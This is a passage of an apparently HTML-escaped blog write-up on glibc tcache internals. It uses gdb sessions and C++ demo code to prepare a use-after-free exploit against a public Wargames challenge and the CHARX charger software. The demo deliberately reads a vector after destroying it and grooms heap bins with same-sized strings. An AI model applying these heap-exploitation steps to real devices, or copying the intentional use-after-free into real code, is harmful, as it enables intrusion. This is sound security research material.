&lt;p&gt;At the crash site, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*next&lt;/code&gt; is a pointer to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x188703&lt;/code&gt; and the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*key&lt;/code&gt; is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x5337669691617803236&lt;/code&gt;. Tcache entries exist only after you have &lt;em&gt;free&lt;/em&gt;‘d some allocated memory. In C++, this can include destructors, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;delete&lt;/code&gt; operator, and classic calls to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;free&lt;/code&gt; standard library function.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  struct tcache_entry *next: 0x188703
  struct tcache_perthread_struct *key: 0x5337669691617803236
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Tcache entries are linked lists of &lt;em&gt;free&lt;/em&gt;‘d items of the same “bin” size. Bin sizes are usually powers of two: 8, 16, 32, 64. The logic that defines each bin size is defined in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;malloc.c&lt;/code&gt;, and like many things in glibc, its true definition is shrouded in macros.&lt;/p&gt;

&lt;p&gt;Developers can use the output of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;malloc_usable_size&lt;/code&gt; function to help determine which bin an allocation will be &lt;em&gt;free&lt;/em&gt;‘d to. Otherwise, you’re left to the debugger, but that’s sometimes all you really need.&lt;/p&gt;

&lt;p&gt;In this example, the value of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*next&lt;/code&gt; (0x188703) is not an address and will not dereference to anything. This is expected because only one object of that bin’s size has been &lt;em&gt;free&lt;/em&gt;‘d. If there were another object of an equivalent size &lt;em&gt;free&lt;/em&gt;‘d before the vector, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*next&lt;/code&gt; would point to it.&lt;/p&gt;

&lt;p&gt;So, to facilitate control over the tcache, we need to free something else, something &lt;em&gt;other than the vector&lt;/em&gt;, but of its same size.&lt;/p&gt;

&lt;p&gt;Let’s do try that now.&lt;/p&gt;

&lt;h1 id=&quot;finding-allocation-sizes-for-tcache-bins&quot;&gt;Finding allocation sizes for tcache bins&lt;/h1&gt;

&lt;blockquote&gt;
  &lt;p&gt;When this node is freed during the list destructor, the chunk will have a size class of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x68&lt;/code&gt;, and will be placed into the &lt;a href=&quot;https://ir0nstone.gitbook.io/notes/types/heap/the-tcache&quot;&gt;tcache&lt;/a&gt; bin of that size&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Here, we want to consider what size a chunk will be by the time a vector is &lt;em&gt;free&lt;/em&gt;‘d.&lt;/p&gt;

&lt;p&gt;If you &lt;a href=&quot;https://github.com/gcc-mirror/gcc/blob/master/libstdc%2B%2B-v3/include/bits/stl_vector.h&quot;&gt;read the source code for a vector&lt;/a&gt;, you’ll notice that the vector class template actually extends the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_Vector_base&lt;/code&gt; structure. You’ll also notice a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_Vector_impl _M_impl&lt;/code&gt; field, which is the first field defined in this, and has a couple of allocation and deallocation methods near it. This &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_M_impl&lt;/code&gt; structure is the backend of the vector type and is a major data structure responsible for many of its dynamic behaviors.&lt;/p&gt;

&lt;p&gt;The first field in this structure represents the first item in the vector. In fact, when you view the address of a vector, this structure field is the address you get back.&lt;/p&gt;

&lt;p&gt;When the vector’s own destructor is called, it calls the destructor of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;~Vector_base&lt;/code&gt; last. Here’s the pared-down destructor definition for clarity:&lt;/p&gt;

&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_Vector_base&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;ptrdiff_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_M_impl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_M_end_of_storage&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_M_impl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_M_start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;_M_deallocate&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_M_impl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_M_start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_M_deallocate&lt;/code&gt; function has  a call path that leads to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;free&lt;/code&gt;. It’s easier to appreciate in the debugger.&lt;/p&gt;

&lt;p&gt;We can break at the call to the vector’s destructor in &lt;em&gt;main&lt;/em&gt;, inspect the argument given, and then break on free. If we do one step, we land at the invocation of &lt;em&gt;free&lt;/em&gt;, where we find that the vector’s address is being &lt;em&gt;free&lt;/em&gt;‘d: that is, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_M_impl&lt;/code&gt; structure, which is allocated at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x6ee800&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Breakpoint 6, in main

(gdb) x/i $pc
=&amp;gt; &amp;lt;main()+376&amp;gt;: call  std::vector&amp;lt;&amp;gt;::~vector

(gdb) x/gx $rdi
0x7fffffffe150: 0x000055555556b2f0

(gdb) b *free
(gdb) c

Breakpoint 7, __GI___libc_free 

(gdb) bt
#0  __GI___libc_free 
#1  std::__new_allocator&amp;lt;&amp;gt;::deallocate 
#2  std::allocator_traits&amp;lt;&amp;gt;::deallocate 
#3  gned long, std::allocator&amp;lt;&amp;gt;::_M_deallocate 
#4  std::_Vector_base&amp;lt;unsigned long, std::allocator&amp;lt;&amp;gt;::~_Vector_base 
#5  std::vector&amp;lt;unsigned long, std::allocator&amp;lt;&amp;gt;::~vector 
#6  main 

(gdb) print/x $rdi
$8 = 0x55555556b2f0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Continue execution. Notice &lt;em&gt;free&lt;/em&gt; is called only one time. So, the size of the data pointed to by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_M_start&lt;/code&gt; is our culprit for tcache binning.&lt;/p&gt;

&lt;p&gt;If we can find the size of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_M_impl&lt;/code&gt; structure, we can get an idea of what sized allocations will end up in its tcache bin and, thus, link to its &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;next&lt;/code&gt; pointer. To get this idea for size, we can apply the reverse logic as before and track where the vector operation allocates memory.&lt;/p&gt;

&lt;p&gt;First, let’s acknowledge that the internal structure is initialized only after the vector is given some elements. We can observe this by tracking the memory from the vector’s creation until the first call to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;push_back&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
// The vector&apos;s internal structure is initialized to null.
(gdb) x/i $pc
=&amp;gt; main+20:  call  std::vector&amp;lt;&amp;gt;::vector
(gdb) x/gx $rdi
0x7fffffffe150: 0x00000000000011ff
(gdb) ni
(gdb) x/gx $rdi
0x7fffffffe150: 0x0000000000000000

(gdb) c
Continuing.

// The structure after the first call to vector::push_back.
Breakpoint 2 in main
(gdb) x/i $pc
=&amp;gt; main+47:  call  std::vector&amp;lt;&amp;gt;::push_back
(gdb) x/gx $rdi
0x7fffffffe150: 0x0000000000000000
(gdb) ni
(gdb) x/gx $rdi
0x7fffffffe0b0: 0x000055555556b2b0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can then set a breakpoint on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;malloc&lt;/code&gt; and continue execution to see the call path:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Breakpoint 1, main () at demo.cpp:6

(gdb) b *malloc
(gdb) c

Breakpoint 2, __GI___libc_malloc (bytes=8) at ./malloc/malloc.c:3301

(gdb) bt
#0  malloc
#1  operator new
#2  std::__new_allocator&amp;lt;&amp;gt;::allocate
#3  std::allocator_traits&amp;lt;&amp;gt;::allocate
#4  std::_Vector_base&amp;lt;&amp;gt;::_M_allocate
#5  std::vector&amp;lt;&amp;gt;::_M_realloc_append&amp;lt;&amp;gt;
#6  std::vector&amp;lt;&amp;gt;::emplace_back&amp;lt;&amp;gt;
#7  std::vector&amp;lt;&amp;gt;::push_back
#8  main
(gdb) print/x $rdi
$1 = 0x8
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can see the call path to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;push_back&lt;/code&gt; leads to the allocation. Because &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;malloc&lt;/code&gt; accepts one argument, a &lt;em&gt;size_t&lt;/em&gt;, we can see the initial allocation size by printing its argument:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) print/x $rdi
$1 = 0x8
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Indeed, integers in x64 are four bytes, so this matches our expectations.&lt;/p&gt;

&lt;p&gt;Now, recall that each invocation of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;push_back&lt;/code&gt; will actually call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;malloc&lt;/code&gt;. This has some interesting implications.&lt;/p&gt;

&lt;p&gt;To appreciate this, we will augment the non-pointer vector example to use a function called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;malloc_usable_size&lt;/code&gt;, which is the target value we need in order to exploit the main code. I intentionally leave out any initial calls to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;push_back&lt;/code&gt; so we can observe the output.&lt;/p&gt;

&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;vector&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;malloc.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vector&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;auto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;auto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v_cast&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static_cast&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;auto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v_usable&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;malloc_usable_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v_cast&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Vector backing usable: 0x%lx&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v_usable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This prints:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Vector backing usable: 0x0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This makes sense because we haven’t actually initialized the vector’s internal structure with memory. If we add one invocation of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;v.push_back(x)&lt;/code&gt;, we get &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x8&lt;/code&gt; (8 bytes). After four invocations, we get &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x40&lt;/code&gt; (64 bytes), and so on.&lt;/p&gt;

&lt;p&gt;Observe some other interesting behaviors:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;If you break on each execution of malloc, and inspect the argument at RDI, you can see the size of the vector’s internal data structure increase by 4, 8, 16, and 32, respectively.&lt;/li&gt;
  &lt;li&gt;Likewise, if you run something like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;v.erase(v.begin())&lt;/code&gt;, the size of the internal structure will &lt;em&gt;not&lt;/em&gt; go down or reduce.&lt;/li&gt;
  &lt;li&gt;Finally, the call to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;v.~vector&lt;/code&gt; will free the internal structure, whose final size is that of the internal structure after all those calls to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;push_back&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;exploiting-older-tcache-implementations&quot;&gt;Exploiting older tcache implementations&lt;/h1&gt;

&lt;blockquote&gt;
  &lt;p&gt;Set a config value to a string of size &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x60&lt;/code&gt; … UAF list traversal goes to 2nd fake node (the freed config string)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Strings can be convenient ways to control data. Here, they can play an interesting role in how the tcache works during a use-after-free condition.&lt;/p&gt;

&lt;p&gt;Let’s build on the driver code from the tcache discussion and add some string allocations and deallocations:&lt;/p&gt;

&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;inttypes.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;vector&amp;gt;
#include &amp;lt;cstring&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NAME&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;AAAAAAAA&quot;&lt;/span&gt;
                   &lt;span class=&quot;s&quot;&gt;&quot;AAAAAAAA&quot;&lt;/span&gt;
                   &lt;span class=&quot;s&quot;&gt;&quot;AAAAAAAA&quot;&lt;/span&gt;
                   &lt;span class=&quot;s&quot;&gt;&quot;AAAAAAAA&quot;&lt;/span&gt;
                   &lt;span class=&quot;s&quot;&gt;&quot;AAAAAAAA&quot;&lt;/span&gt;
                   &lt;span class=&quot;s&quot;&gt;&quot;AAAAAAAA&quot;&lt;/span&gt;
                   &lt;span class=&quot;s&quot;&gt;&quot;AAAAAAAA&quot;&lt;/span&gt;
                   &lt;span class=&quot;s&quot;&gt;&quot;AAAAAAA&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vector&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;nullptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;push_back&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;push_back&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;push_back&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;push_back&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;strncpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NAME&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x3f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;delete&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vector&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%lu&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If we compile it with more recent glibc versions, it won’t do anything of interest, and we can’t control much. So let’s take a detour and see which versions are used by the Wargames challenge and the CHARX project. Recall that the CHARX project is available online and not encrypted, and that this specific Wargames challenge is open to the public, so it’s fair game to inspect them.&lt;/p&gt;

&lt;p&gt;The CHARX executables were likely built with glibc 2.29:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;strings CharxControllerAgent | grep -i GLIBC_
GLIBC_2.4
GLIBC_2.29
GLIBC_2.8
GLIBC_2.28
GLIBC_2.15
GLIBC_2.17
GLIBC_2.7
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Likewise, the Wargames platform is likely using glibc 2.27:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wdb&amp;gt; vmmap
0x400000-0x409000 r-x charxpost_destructors
...
0x7f0000000000-0x7f0000029000 r-x ld-2.27.so
...
0x7f00007c4000-0x7f00009ab000 r-x libc-2.27.so
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This gives us a range of versions to try out. The obvious way is to build glibc, ldd, and gcc using the specified versions. This would give us a chance to explore the differences in source code and further understand what changes in the memory allocator between old and current versions.&lt;/p&gt;

&lt;p&gt;For now, we’re going to take a shortcut and just use an old Ubuntu container image, which is up to the spec we need:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@cba6a210200c:/# grep VERSION= /etc/os-release
VERSION=&quot;18.04.6 LTS (Bionic Beaver)&quot;

root@cba6a210200c:/# ldd --version
ldd (Ubuntu GLIBC 2.27-3ubuntu1.6) 2.27
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can substitute the CLI &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gcc&lt;/code&gt; with a container that does the same thing but for a different version:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ cat Dockerfile
FROM ubuntu:18.04

RUN apt update &amp;amp;&amp;amp; \
    apt install -y --no-install-recommends g++

ENTRYPOINT [&quot;g++&quot;]

$ docker build -t ret2gpp .
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then build the application, passing the G++ options to the container options:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker run -v &quot;$(pwd)&quot;:/code --rm ret2gpp \
	-g -static /code/demo.cpp -o /code/demo
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;em&gt;Note: The use of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;static&lt;/code&gt; here is essential. Because any modern host system likely uses a different version of libc, you probably won’t observe the same behavior as you would when it’s executed on a system with that version of libc installed. By compiling as static, we provide a portable way to preserve those behaviors across different x64 systems.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Let’s open in GDB and break on the instruction just after the vector’s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[]&lt;/code&gt; operator:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) disas main
...
   0x0000000000400cf9 &amp;lt;+268&amp;gt;:   call   0x400e10 &amp;lt;vector::operator[]&amp;gt;
   0x0000000000400cfe &amp;lt;+273&amp;gt;:   mov    rax,QWORD PTR [rax]
...

(gdb) b *main+273
Breakpoint 1 at 0x400cfe: file /code/ver.cpp, line 32.
(gdb) r
...
Breakpoint 1, 0x0000000000400cfe in main () at /code/ver.cpp:32
32        printf(&quot;%lu\n&quot;, v[0]);

(gdb) x/i $pc
=&amp;gt; 0x400cfe &amp;lt;main()+273&amp;gt;:       mov    rax,QWORD PTR [rax]

(gdb) x/4gx $rax
0x6ee7a0:       0x00000000006ee7f0    0x00000000006dc1d0
0x6ee7b0:       0x0000000000000009    0x000000000000000d
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

